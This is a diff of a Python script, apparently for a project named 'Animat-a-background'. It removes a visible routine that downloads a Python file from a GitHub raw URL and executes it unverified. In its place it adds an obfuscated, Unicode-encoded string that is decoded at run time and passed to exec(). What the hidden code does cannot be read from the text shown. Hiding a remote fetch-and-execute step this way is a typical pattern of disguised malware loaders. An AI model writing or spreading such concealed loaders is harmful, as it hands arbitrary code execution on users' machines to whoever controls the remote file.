@@ -5,39 +5,5 @@
 # 
 # ]
 
-def Main():
-    print("[Animat-a-background] Running...")
-    
-    try:
-        import urllib.request
-    except:
-        print("[Animat-a-background] Failed to import urlib.request")
-        exit()
-        
-    try:
-        r = urllib.request.urlopen('https://raw.githubusercontent.com/CrazyH2/Animat-a-background/refs/heads/main/versions/latest.py')
-    except:
-        print("[Animat-a-background] Failed to fetch python update")
-        exit()
-
-    try:
-        t = r.read()
-    except:
-        print("[Animat-a-background] Failed to parse python update")
-        exit()
-        
-    custom_globals = {
-        "__builtins__": __builtins__,
-        "__name__": "__main__",  # Or a more appropriate module name
-        "__file__": "<exec_string>", # Can be helpful for debugging
-        "__package__": None, # Or the package name if applicable
-    }
-    
-    try:
-        exec(t, custom_globals, custom_globals)
-    except Exception as e:
-        print(f"[Animat-a-background] Failed to execute update: {e}")
-        exit()
-
-if __name__ == "__main__":
-    Main()
+# Using https://dthung1602.github.io/pyobfusinator/
+b='Ḙ̡͉͎͉͎͔̻͎͉͍͔͇̈́͆̀́̈̉ͯ̀̀̀̀͐͒̈̂́̍́̍͂́̓͋͒̚ͅ͏͕͎̲͕͎͎͉͎͇͔͙͉͍̈́̽̀̎̎̎̂̉ͯ̀̀̀̀ͯ̀̀̀̀͒ͯ̀̀̀̀̀̀̀̀͐̚͏̡͔͕͉͕͓͔͔͉͎͔̻͎͉͍͔͇͒̀͒͌͌͂̎͒͑ͯ̀̀̀̀̓͐ͯ̀̀̀̀̀̀̀̀͐͒̈̂́̍́̍͂́̓͋͒͘̚ͅͅͅͅ͏͕͎̦͉͔̈́̽̀́͌̈́̀ͅ͏͉͍̀͐͏͔͕͉͕͓͔͉͔͔͙̝͕͉͕͓͔͕͒̀͒͌͂̎͒͑̂̉ͯ̀̀̀̀̀̀̀̀̈̉ͯ̀̀̀̀̀̀̀̀ͯ̀̀̀̀͒ͯ̀̀̀̀̀̀̀̀͒̀̀͒͌͌͂̎͒͑̎͒͌͘̚ͅͅͅͅͅ͏͎͈͔͔͓͇͉͔͈͕͕͓͐̈̇͐̏̏͒́͗̎͂͒̓̚ͅͅ͏͎͔͎͔̎̓ͅ͏̨̡͍̣͚͙͎͉͍͔͇̏͒́̒̏́̍́̍͂́̓͋͒͏͕͎͓͈͓͍͉͎͖͓͉̈́̏͒͆̏́̈́̏́̏͒ͅͅͅ͏̡͎͓͔͓͔͙͔͉͎͔̻͎͉͍͔͇̏͌́̎͐̇̉ͯ̀̀̀̀̓͐ͯ̀̀̀̀̀̀̀̀͐͒̈̂́̍́̍͂́̓͋͒͘̚ͅͅͅ͏͕͎̦͉͔̈́̽̀́͌̈́̀ͅ͏͔͈͙͔͈̀͆̓̀͐ͅ͏̡͎͕͔͉͔͔͙͔̝͔͉͎͔̻͎͉͍͔͇̀͐̈́́̂̉ͯ̀̀̀̀̀̀̀̀̈̉ͯͯ̀̀̀̀͒ͯ̀̀̀̀̀̀̀̀̀̀͒̎͒́̈́̈̉ͯ̀̀̀̀͐ͯ̀̀̀̀̀̀̀̀͐͒̈̂̍̍͂͋͒͘̚͘̚ͅͅͅͅͅ͏͕͎̦͉͔̈́̽̀́͌̈́̀ͅ͏͓͙͔͈̀͐́͒̀͐ͅ͏͎͕͔͉͔͕͓͔̀͐̈́́̂̉ͯ̀̀̀̀̀̀̀̀̈̉ͯ̀̀̀̀̀̀̀̀ͯ̀̀̀̀̓͘ͅͅ͏͍͇̿͌͏͓̝͕͉͔͉͎͓͕͉͔͉͎͓͎͍͍͉͎̯͍͂́͌̀̀͛ͯ̀̀̀̀̀̀̀̀̂̿̿͂͌̿̿̂̀̿̿͂͌̿̿̌ͯ̀̀̀̀̀̀̀̀̂̿̿́̿̿̂̀̂̿̿̿̿̂̌̀̀̃̀͒̀̀̚̚ͅ͏͒̀́͐͐͒ͅ͏͉͔͍͐͒́̀ͅ͏͕͎͍͉̜͓͔͉͎͇̞̣͎͈͕̈́͌̀́ͯ̀̀̀̀̀̀̀̀̂̿̿͆͌̿̿̂̀̂̓̿͒̂̌̀̃̀́̀͂̀͌͐͆͌̀͆̚͘ͅͅͅͅͅͅͅ͏͕͇͇͉͎͇͇̮͒̀̈́͂ͯ̀̀̀̀̀̀̀̀̂̿̿͐́̓͋́̿̿̂̀̚ͅͅ͏͎̯͔͈͇͎͍͉͉͔͙͔͕͓͔̌̀̃̀͒̀̀͐́̓͋́̀́̀͆̀́͐͐͌̓́͂͌ͯ̀̀̀̀ͯ̀̀̀̀ͯ̀̀̀̀͒ͯ̀̀̀̀̀̀̀̀̈̌̀̚͘͝ͅͅͅͅͅͅͅ͏͍͇̿͌͏͓͕͓͔͂́͌̌̀̓͏͍͇̿͌͏͓͔̥͔͉͂́͌̉ͯ̀̀̀̀̓͐̀̓͐͘͘ͅͅͅ͏̡͎͓͉͎͔̻͎͉͍͔͇̀́̀ͯ̀̀̀̀̀̀̀̀͐͒̈͆̂́̍́̍͂́̓͋͒̚ͅ͏͕͎̦͉͔̈́̽̀́͌̈́̀ͅ͏͕͔͕͔͉͔͉͎͍̝̝͍͉͎̭͉͎̀̓̀͐̈́́̀͛̂̉ͯ̀̀̀̀̀̀̀̀̈̉ͯͯ͆̀̿̿́̿̿̀̀̂̿̿́̿̿̂ͯ̀̀̀̀̈̉͘̚͘̚͝ͅͅͅͅͅͅͅ'.encode();exec(''.join(chr(((h<<6&64|c&63)+22)%133+10)for h,c in zip(b[1::2],b[2::2])))
